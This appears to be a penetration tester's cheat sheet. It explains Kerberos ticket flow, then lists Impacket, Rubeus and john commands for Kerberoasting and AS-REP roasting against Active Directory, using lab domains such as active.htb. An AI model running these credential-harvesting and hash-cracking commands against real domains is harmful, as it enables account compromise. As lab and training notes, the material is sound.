# Kerberos

When a user logs onto their workstation, their machine will send an AS-REQ message to the Key Distribution Center (KDC), aka Domain Controller, requesting a TGT using a secret key derived from the user’s password.

The KDC verifies the secret key with the password it has stored in Active Directory for that user. Once validated, it returns the TGT in an AS-REP message.The TGT contains the user’s identity and is encrypted with the KDC secret key (the krbtgt account).

When the user attempts to access a resource backed by Kerberos authentication (e.g. a file share), their machine looks up the associated Service Principal Name (SPN). It then requests (TGS-REQ) a Ticket Granting Service Ticket (TGS) for that service from the KDC, and presents its TGT as a means of proving they're a valid user.

The KDC returns a TGS (TGS-REP) for the service in question to the user, which is then presented to the actual service. The service inspects the TGS and decides whether it should grant the user access or not.


## Kerberoasting
Kerberoasting is a technique for requesting TGS’s for services running under the context of domain accounts and cracking them offline to reveal their plaintext passwords.

### Using [Impacket](https://github.com/SecureAuthCorp/impacket)

Attack carried out from attacker machine.
```markdown
GetUserSPNs.py -request -dc-ip 10.129.x.x active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
```

### Using [Rubeus.exe](https://github.com/GhostPack/Rubeus)

Attack carried out form target machine (upload the binary to target machine).
```markdown
.\Rubeus.exe kerberoast /simple /nowrap
```

For specific user.
```markdown
.\Rubeus.exe kerberoast /user:svc_mssql /nowrap
```

Get the hash and try to crack it offline with john.
```markdown
john --format=krb5tgs --wordlist=wordlist hash.txt
```


## AS-REP Roasting

If a user does not have Kerberos pre-authentication enabled, an AS-REP can be requested for that user, and part of the reply can be cracked offline to recover their plaintext password. 


### Using [Impacket](https://github.com/SecureAuthCorp/impacket)
```markdown
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/fsmith -dc-ip 10.129.1.165
```

For multiple Users.
```markdown
for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip 10.129.168.220 EGOTISTICAL-BANK.LOCAL/${user} | grep -v Impacket; done
```



### Using [Rubeus.exe](https://github.com/GhostPack/Rubeus)
```markdown
.\Rubeus.exe asreproast /user:fsmith /nowrap
```

Hash cracking.
```markdown
john --format=krb5asrep --wordlist=wordlist hash.txt
```


